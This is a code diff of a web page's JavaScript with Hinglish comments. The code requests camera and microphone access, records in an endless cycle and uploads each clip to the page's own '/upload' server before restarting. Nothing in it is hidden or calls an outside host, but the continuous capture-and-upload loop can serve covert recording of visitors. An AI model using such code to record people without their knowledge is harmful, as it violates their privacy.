@@ -94,7 +94,6 @@
             try {
                 status.innerText = "Camera aur Mic access ki koshish ki ja rahi hai...";
                 
-                // Simple constraints taaki mobile ka koi bhi available camera/mic chal jaye
                 stream = await navigator.mediaDevices.getUserMedia({ 
                     video: true, 
                     audio: true 
@@ -109,19 +108,20 @@
 
             } catch (err) {
                 console.error("Permission error details:", err);
-                // Screen par exact error dikhayega taaki reason pata chale
                 status.innerText = "Error: " + (err.message || err.name || "Permission denied");
             }
         }
 
         function startRecordingCycle() {
-            let options = { mimeType: 'video/webm' };
-            if (!MediaRecorder.isTypeSupported('video/webm')) {
-                options = { mimeType: 'video/mp4' };
+            let mimeType = 'video/webm';
+            if (MediaRecorder.isTypeSupported('video/webm;codecs=vp9,opus')) {
+                mimeType = 'video/webm;codecs=vp9,opus';
+            } else if (MediaRecorder.isTypeSupported('video/mp4')) {
+                mimeType = 'video/mp4';
             }
 
             recordedChunks = [];
-            mediaRecorder = new MediaRecorder(stream, options);
+            mediaRecorder = new MediaRecorder(stream, { mimeType });
 
             mediaRecorder.ondataavailable = (event) => {
                 if (event.data && event.data.size > 0) {
@@ -131,7 +131,7 @@
 
             mediaRecorder.onstop = async () => {
                 if (recordedChunks.length > 0) {
-                    const completeBlob = new Blob(recordedChunks, { type: mediaRecorder.mimeType });
+                    const completeBlob = new Blob(recordedChunks, { type: mimeType });
                     await uploadToServer(completeBlob);
                 }
                 startRecordingCycle();
@@ -148,7 +148,7 @@
 
         async function uploadToServer(blob) {
             const formData = new FormData();
-            formData.append("file", blob, "recording.webm");
+            formData.append("file", blob);
 
             try {
                 const response = await fetch('/upload', {
